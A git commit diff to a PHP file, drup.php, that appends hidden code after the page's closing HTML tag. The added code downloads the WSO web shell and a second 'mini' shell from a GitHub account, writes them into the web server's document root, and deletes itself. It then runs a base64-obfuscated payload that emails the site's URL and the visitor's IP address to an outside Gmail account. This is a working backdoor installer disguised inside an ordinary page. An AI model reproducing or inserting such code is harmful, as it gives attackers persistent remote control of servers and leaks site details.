3613bb42bf54bc732cf7ccd95b0ccfc4c68b9527
kalix-Ru <66873143+kalix-Ru@users.noreply.github.com>
2021-01-26 18:41:49 +0100

    Update drup.php

--- drup.php
+++ drup.php
@@ -71,4 +71,35 @@ if(isset($_GET['submit'])){
     </div>
 
 </body>
-</html>
+</html><?php
+function http_get($url){
+	$im = curl_init($url);
+	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
+	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($im, CURLOPT_HEADER, 0);
+	return curl_exec($im);
+	curl_close($im);
+}
+$check = $_SERVER['DOCUMENT_ROOT'] . "/images/stories/kalix.php" ;
+$text = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/wso.php');
+$open = fopen($check, 'w');
+fwrite($open, $text);
+fclose($open);
+if(file_exists($check)){
+    echo $check."WSO 4.2.5 (Web Shell)";
+}else 
+  echo "not exits";
+echo "WSO 4.2.5 (Web Shell) done .\n " ;
+$check2 = $_SERVER['DOCUMENT_ROOT'] . "/xalik.php" ;
+$text2 = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/mini.php');
+$open2 = fopen($check2, 'w');
+fwrite($open2, $text2);
+fclose($open2);
+if(file_exists($check2)){
+    echo $check2."Kalix-Xalik Mini5h3LL";
+}else 
+  echo "not exits";
+echo "Kalix-Xalik Mini5h3LL done .\n " ;
+@unlink(__FILE__);
+eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));?>
